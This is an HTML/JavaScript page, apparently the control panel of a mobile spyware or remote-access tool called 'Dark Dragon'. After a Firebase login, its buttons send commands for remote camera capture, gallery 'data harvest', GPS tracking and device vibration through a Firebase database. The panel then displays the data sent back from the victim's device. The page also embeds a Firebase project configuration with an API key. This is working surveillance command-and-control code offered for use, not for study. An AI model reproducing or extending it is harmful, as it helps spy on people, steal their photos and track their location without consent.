<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <title>DARK DRAGON | RED TERMINAL</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        body { 
            background: #000; 
            color: #ff0000; 
            font-family: 'Courier New', monospace; 
            margin: 0; 
            overflow-x: hidden; 
        }

        .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
        #login-box { 
            border: 2px solid #ff0000; 
            padding: 40px; 
            box-shadow: 0 0 30px #ff0000; 
            text-align: center; 
            background: rgba(20, 0, 0, 0.9); 
        }

        input { 
            display: block; width: 280px; margin: 15px 0; 
            background: #111; border: 1px solid #ff0000; 
            color: #ff0000; padding: 12px; outline: none; 
        }

        button { 
            width: 100%; background: #ff0000; color: #000; 
            border: none; padding: 12px; font-weight: bold; 
            cursor: pointer; transition: 0.5s; 
        }
        button:hover { background: #fff; color: #ff0000; box-shadow: 0 0 20px #fff; }

        #dashboard { display: none; padding: 20px; box-sizing: border-box; min-height: 100vh; }
        
        .header { 
            border-bottom: 2px solid #ff0000; padding-bottom: 10px; 
            margin-bottom: 20px; display: flex; justify-content: space-between; 
            text-shadow: 0 0 10px #ff0000;
        }

        .panel { 
            border: 1px solid #ff0000; padding: 20px; 
            background: rgba(15, 0, 0, 0.8); 
            box-shadow: inset 0 0 15px rgba(255, 0, 0, 0.2);
            position: relative;
        }

        .panel::after {
            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px;
            background: #ff0000; box-shadow: 0 0 15px #ff0000;
            animation: scanning 4s linear infinite;
        }
        @keyframes scanning { 0% { top: 0; } 100% { top: 100%; } }

        .log-screen { 
            background: #0a0000; height: 300px; overflow-y: auto; 
            padding: 10px; font-size: 13px; border: 1px solid #ff0000; color: #ff4d4d; 
        }

        .cmd-btn { 
            display: block; width: 100%; margin-bottom: 12px; 
            text-align: left; background: transparent; 
            border: 1px solid #ff0000; color: #ff0000; 
            padding: 12px; cursor: pointer; font-weight: bold;
        }
        .cmd-btn:hover { background: #ff0000; color: #000; box-shadow: 0 0 15px #ff0000; }

        .grid { display: grid; grid-template-columns: 1fr 2fr; gap: 20px; }

        .status-dot { 
            height: 10px; width: 10px; background-color: #ff0000; 
            border-radius: 50%; display: inline-block; margin-right: 5px; 
            box-shadow: 0 0 10px #ff0000; animation: blink 0.8s infinite; 
        }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="container" id="auth-container">
        <div id="login-box">
            <h1 style="margin:0;">🔴 DARK DRAGON</h1>
            <p style="letter-spacing: 3px; font-size: 10px;">RESTRICTED AREA: ADMIN ONLY</p>
            <input type="email" id="email" placeholder="ADMIN ID (Email)">
            <input type="password" id="pass" placeholder="SECURITY KEY">
            <button onclick="login()">Bypass Security & Enter</button>
        </div>
    </div>

    <div id="dashboard">
        <div class="header">
            <div><span class="status-dot"></span> CONNECTION: SECURE</div>
            <div style="font-weight: bold; letter-spacing: 5px;">AKINDU MASTER TERMINAL</div>
            <button onclick="logout()" style="width: auto; padding: 5px 15px;">ABORT</button>
        </div>

        <div class="grid">
            <div class="panel">
                <h3 style="border-bottom: 1px solid #ff0000;">[ COMMANDS ]</h3>
                <button class="cmd-btn" onclick="sendCommand('camera')">>> EXECUTE: REMOTE CAMERA</button>
                <button class="cmd-btn" onclick="sendCommand('gallery')">>> EXECUTE: DATA HARVEST</button>
                <button class="cmd-btn" onclick="sendCommand('location')">>> EXECUTE: GPS TRACKING</button>
                <button class="cmd-btn" onclick="sendCommand('vibrate')">>> EXECUTE: DEVICE SHOCK</button>
                <button class="cmd-btn" onclick="sendCommand('notify')">>> SEND: ENCRYPTED MSG</button>
            </div>

            <div class="panel">
                <h3 style="border-bottom: 1px solid #ff0000;">[ SYSTEM DATA STREAM ]</h3>
                <div class="log-screen" id="logs">
                    [INFO]: Establishing handshake with Firebase...<br>
                    [SUCCESS]: System ready for commands.
                </div>
                
                <h4 style="margin-top:20px; color: #ff0000;">RECEIVED PAYLOAD:</h4>
                <div id="data-preview" style="border: 1px dashed #ff0000; padding: 15px; background: #050000; min-height: 50px;">
                    Waiting for device payload...
                </div>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyB4K6JgS_tn5rDLeA1i9-xqQ9rNZSE5ms8",
            authDomain: "dark-dragon-team.firebaseapp.com",
            databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com",
            projectId: "dark-dragon-team",
            storageBucket: "dark-dragon-team.firebasestorage.app",
            messagingSenderId: "307911947460",
            appId: "1:307911947460:web:8ef3475cdeb54ae1448591"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();

        function login() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            auth.signInWithEmailAndPassword(email, pass)
                .then(() => {
                    document.getElementById('auth-container').style.display = 'none';
                    document.getElementById('dashboard').style.display = 'block';
                    addLog("Admin verified. Accessing main servers...");
                    listenForData();
                })
                .catch(err => alert("ACCESS DENIED!"));
        }

        // මෙතන තමයි වෙනස කළේ - App එකට කෙලින්ම කියවන්න පුළුවන් වෙන්න
        function sendCommand(action) {
            db.ref('commands').set(action) 
            .then(() => {
                addLog("Command Sent -> " + action.toUpperCase());
            });
        }

        function listenForData() {
            db.ref('device_data').on('value', (snapshot) => {
                const data = snapshot.val();
                if(data) {
                    document.getElementById('data-preview').innerText = data;
                    addLog("Payload Received: " + data);
                }
            });
        }

        function addLog(msg) {
            const logBox = document.getElementById('logs');
            logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}]: ${msg}`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        function logout() { auth.signOut().then(() => location.reload()); }
    </script>
</body>
</html>
